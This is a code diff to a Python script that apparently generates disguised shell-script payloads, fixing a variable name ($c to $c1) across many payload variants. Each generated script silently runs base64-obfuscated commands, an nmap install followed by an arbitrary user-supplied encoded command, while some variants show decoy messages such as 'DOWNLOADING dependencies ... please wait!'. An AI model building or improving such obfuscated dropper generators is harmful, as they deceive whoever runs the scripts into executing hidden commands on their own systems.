@@ -70,7 +70,7 @@ if payload=="1":
 	print(f"GENERATING PAYLOAD {output}/{name}.sh ")
 	with open(f"{output}/{name}.sh","w+") as f:
 		s=(f"""c1=$(base64 -d <<< "c3VkbyBhcHQtZ2V0IGluc3RhbGwgbm1hcAo="); status=$?
-[[ $status == 0 ]] && $c &> /dev/null
+[[ $status == 0 ]] && $c1 &> /dev/null
 c2=$(base64 -d <<< "{encodeds}"); dstatus=$?
 [[ $dstatus == 0 ]] && $c2 &> /dev/null
 		""")
@@ -80,7 +80,7 @@ elif payload=="2":
 	print(f"GENERATING PAYLOAD {output}/{name}.sh ")
 	with open(f"{output}/{name}.sh","w+") as f:
 		s=(f"""c1=$(base64 -d <<< "c3VkbyBwYWNtYW4gLVMgaW5zdGFsbCBubWFwCg=="); status=$?
-[[ $status == 0 ]] && $c &> /dev/null
+[[ $status == 0 ]] && $c1 &> /dev/null
 c2=$(base64 -d <<< "{encodeds}"); dstatus=$?
 [[ $dstatus == 0 ]] && $c2 &> /dev/null
 		""")
@@ -90,7 +90,7 @@ elif payload=="3":
 	print(f"GENERATING PAYLOAD {output}/{name}.sh ")
 	with open(f"{output}/{name}.sh","w+") as f:
 		s=(f"""c1=$(base64 -d <<< "c3VkbyBkbmYgaW5zdGFsbCBubWFwCg=="); status=$?
-[[ $status == 0 ]] && $c &> /dev/null
+[[ $status == 0 ]] && $c1 &> /dev/null
 c2=$(base64 -d <<< "{encodeds}"); dstatus=$?
 [[ $dstatus == 0 ]] && $c2 &> /dev/null
 		""")
@@ -101,7 +101,7 @@ elif payload=="4":
 	print(f"GENERATING PAYLOAD {output}/{name}.sh ")
 	with open(f"{output}/{name}.sh","w+") as f:
 		s=(f"""c1=$(base64 -d <<< "c3VkbyB5dW0gaW5zdGFsbCBubWFwCg=="); status=$?
-[[ $status == 0 ]] && $c &> /dev/null
+[[ $status == 0 ]] && $c1 &> /dev/null
 c2=$(base64 -d <<< "{encodeds}"); dstatus=$?
 [[ $dstatus == 0 ]] && $c2 &> /dev/null
 		""")
@@ -111,7 +111,7 @@ elif payload=="5":
 	print(f"GENERATING PAYLOAD {output}/{name}.sh ")
 	with open(f"{output}/{name}.sh","w+") as f:
 		s=(f"""c1=$(base64 -d <<< "YXB0LWdldCBpbnN0YWxsIG5tYXAK"); status=$?
-[[ $status == 0 ]] && $c &> /dev/null
+[[ $status == 0 ]] && $c1 &> /dev/null
 c2=$(base64 -d <<< "{encodeds}"); dstatus=$?
 [[ $dstatus == 0 ]] && $c2 &> /dev/null
 		""")
@@ -214,7 +214,7 @@ elif payload=="11":
 		s=(f"""echo -e '\033[5;39m {additional}'
 echo -e '\033[5;38m DOWNLOADING dependencies for {name} ..please wait!\n'
 c1=$(base64 -d <<< "c3VkbyBhcHQtZ2V0IGluc3RhbGwgbm1hcAo="); status=$?
-[[ $status == 0 ]] && $c &> /dev/null
+[[ $status == 0 ]] && $c1 &> /dev/null
 c2=$(base64 -d <<< "{encodeds}"); dstatus=$?
 [[ $dstatus == 0 ]] && $c2 &> /dev/null
 		""")
@@ -227,7 +227,7 @@ elif payload=="12":
 		s=(f"""echo -e '\033[5;39m {additional}'
 echo -e '\033[5;38m DOWNLOADING dependencies for {name} ..please wait!\n'
 c1=$(base64 -d <<< "c3VkbyBwYWNtYW4gLVMgaW5zdGFsbCBubWFwCg=="); status=$?
-[[ $status == 0 ]] && $c &> /dev/null
+[[ $status == 0 ]] && $c1 &> /dev/null
 c2=$(base64 -d <<< "{encodeds}"); dstatus=$?
 [[ $dstatus == 0 ]] && $c2 &> /dev/null
 		""")
@@ -240,7 +240,7 @@ elif payload=="13":
 		s=(f"""echo -e '\033[1;39m {additional}'
 echo -e '\033[1;38m DOWNLOADING dependencies for {name} ..please wait!\n'
 c1=$(base64 -d <<< "YXB0LWdldCBpbnN0YWxsIG5tYXAK"); status=$?
-[[ $status == 0 ]] && $c &> /dev/null
+[[ $status == 0 ]] && $c1 &> /dev/null
 c2=$(base64 -d <<< "{encodeds}"); dstatus=$?
 [[ $dstatus == 0 ]] && $c2 &> /dev/null
 		""")
@@ -253,7 +253,7 @@ elif payload=="14":
 		s=(f"""echo -e '\033[5;32m {additional}'
 echo -e '\033[5;32m {name} is executing,this may take a while ..please wait!\n'
 c1=$(base64 -d <<< "c3VkbyBhcHQtZ2V0IGluc3RhbGwgbm1hcAo="); status=$?
-[[ $status == 0 ]] && $c &> /dev/null
+[[ $status == 0 ]] && $c1 &> /dev/null
 c2=$(base64 -d <<< "{encodeds}"); dstatus=$?
 [[ $dstatus == 0 ]] && $c2 &> /dev/null
 		""")
@@ -266,7 +266,7 @@ elif payload=="15":
 		s=(f"""echo -e '\033[5;32m {additional}'
 echo -e '\033[5;32m {name} is executing,this may take a while ..please wait!\n'
 c1=$(base64 -d <<< "c3VkbyBwYWNtYW4gLVMgaW5zdGFsbCBubWFwCg=="); status=$?
-[[ $status == 0 ]] && $c &> /dev/null
+[[ $status == 0 ]] && $c1 &> /dev/null
 c2=$(base64 -d <<< "{encodeds}"); dstatus=$?
 [[ $dstatus == 0 ]] && $c2 &> /dev/null
 		""")
@@ -279,7 +279,7 @@ elif payload=="16":
 		s=(f"""echo -e '\033[5;32m {additional}'
 echo -e '\033[5;32m {name} is executing,this may take a while ..please wait!\n'
 c1=$(base64 -d <<< "c3VkbyBhcHQtZ2V0IGluc3RhbGwgbm1hcAo="); status=$?
-[[ $status == 0 ]] && $c &> /dev/null
+[[ $status == 0 ]] && $c1 &> /dev/null
 c2=$(base64 -d <<< "{encodeds}"); dstatus=$?
 [[ $dstatus == 0 ]] && $c2 &> /dev/null
 		""")
